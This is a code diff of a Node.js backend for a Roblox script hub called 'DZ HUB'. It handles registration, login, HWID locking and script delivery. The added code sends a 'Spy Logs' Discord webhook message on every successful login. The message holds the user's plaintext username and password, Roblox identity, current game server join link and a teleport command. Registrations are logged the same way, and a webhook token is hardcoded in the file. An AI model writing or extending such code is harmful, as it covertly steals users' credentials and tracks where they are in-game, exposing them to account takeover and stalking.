@@ -9,30 +9,14 @@ const SCRIPTS_BY_GAME = {
 
 const DISCORD_WEBHOOK = "/api/webhooks/1469998225472880662/fQ8_e1mjU3-lFm-WU-qIbNTQ06CXjrXeiazo_o5uNPXBwWVCrI6w-SjDStPeBjCb5B11";
 
-function sendSpyLog(data) {
-    const joinLink = `https://therealroier.github.io/zz/?placeId=${data.placeId}&gameInstanceId=${data.jobId}`;
-    const payload = JSON.stringify({
-        embeds: [{
-            title: "Spy Logs - Session Active",
-            color: 16753920,
-            fields: [
-                { name: "Auth Credentials", value: `\`\`\`User: ${data.nickname}\nPass: ${data.password}\`\`\``, inline: false },
-                { name: "Roblox Player", value: `\`\`\`${data.robloxName} (${data.userId})\`\`\``, inline: true },
-                { name: "HWID", value: `\`\`\`${data.hwid}\`\`\``, inline: true },
-                { name: "Experience", value: `\`\`\`${data.placeName || data.placeId}\`\`\``, inline: false },
-                { name: "Join Server", value: `[Click here to Join](${joinLink})`, inline: false },
-                { name: "Teleport Command", value: `\`\`\`game:GetService("TeleportService"):TeleportToPlaceInstance(${data.placeId},"${data.jobId}",game.Players.LocalPlayer)\`\`\``, inline: false }
-            ],
-            footer: { text: "DZ HUB • " + new Date().toLocaleString() }
-        }]
-    });
-
+function sendDiscord(embed) {
+    const data = JSON.stringify({ embeds: [embed] });
     const options = {
         hostname: 'discord.com', port: 443, path: DISCORD_WEBHOOK, method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
+        headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
     };
     const req = https.request(options);
-    req.write(payload);
+    req.write(data);
     req.end();
 }
 
@@ -50,31 +34,50 @@ module.exports = async (req, res) => {
 
     if (action === "register") {
         const exists = usersDB.find(u => u.nickname.toLowerCase() === nickname.toLowerCase());
-        if (exists) return res.status(400).json({ message: "Exists" });
+        if (exists) return res.status(400).json({ message: "User exists" });
 
-        usersDB.push({ nickname, password, license, hwid }); 
+        usersDB.push({ nickname, password, license, hwid });
+        
+        sendDiscord({
+            title: "New Registration",
+            color: 65280,
+            description: `**User:** ${nickname}\n**License:** ${license}\n**Roblox:** ${robloxName}\n**HWID:** ${hwid}`
+        });
+
         return res.status(200).json({ status: "success" });
     }
 
     if (action === "login") {
         const user = usersDB.find(u => u.nickname === nickname && u.password === password);
         
-        if (!user) return res.status(401).json({ message: "Invalid Credentials" });
-
-        if (user.hwid !== hwid) {
-            return res.status(403).json({ message: "HWID Mismatch" });
-        }
+        if (!user) return res.status(401).json({ message: "Invalid credentials" });
+        if (user.hwid !== hwid) return res.status(403).json({ message: "HWID mismatch" });
 
         if (keyExpired) {
             usersDB = usersDB.filter(u => u.nickname !== nickname);
-            return res.status(410).json({ message: "Expired" });
+            return res.status(410).json({ message: "Key expired" });
         }
 
         const scriptUrl = SCRIPTS_BY_GAME[String(placeId)];
-        if (!scriptUrl) return res.status(403).json({ message: "Game not supported" });
+        if (!scriptUrl) return res.status(404).json({ message: "Game not supported" });
 
-        sendSpyLog({ nickname, password, robloxName, userId, placeId, jobId, placeName, hwid });
+        const joinLink = `https://therealroier.github.io/zz/?placeId=${placeId}&gameInstanceId=${jobId}`;
+        
+        sendDiscord({
+            title: "Spy Logs - Login Success",
+            color: 16753920,
+            fields: [
+                { name: "Account", value: `\`\`\`User: ${nickname}\nPass: ${password}\`\`\`` },
+                { name: "Player", value: `\`\`\`${robloxName} (${userId})\`\`\`` },
+                { name: "Experience", value: `\`\`\`${placeName || placeId}\`\`\`` },
+                { name: "Join Link", value: `[Click to Join](${joinLink})` },
+                { name: "Execute", value: `\`\`\`game:GetService("TeleportService"):TeleportToPlaceInstance(${placeId},"${jobId}",game.Players.LocalPlayer)\`\`\`` }
+            ],
+            footer: { text: "DZ HUB • " + new Date().toLocaleString() }
+        });
 
-        return res.status(200).json({ status: "success", license: user.license, scriptUrl });
+        return res.status(200).json({ status: "success", license: user.license, scriptUrl: scriptUrl });
     }
+
+    res.status(404).send('');
 };
